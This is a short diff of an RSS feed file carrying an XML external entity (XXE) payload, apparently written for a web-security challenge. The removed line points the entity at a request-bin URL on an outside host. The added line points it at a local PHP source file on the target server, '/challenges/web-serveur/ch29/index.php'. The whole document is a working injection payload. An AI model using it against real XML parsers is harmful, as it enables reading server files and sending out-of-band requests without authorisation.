@@ -1,7 +1,7 @@
 <?xml version="1.0" encoding="UTF-8" ?>
 <rss version="2.0">
 <!DOCTYPE title [ <!ELEMENT title ANY >
-<!ENTITY xxe SYSTEM "http://requestbin.fullcontact.com/1360pr21" >]>
+<!ENTITY xxe SYSTEM "file:///challenges/web-serveur/ch29/index.php" >]>
 <channel>
   <title>W3Schools Home Page</title>
   <link>https://www.w3schools.com</link>
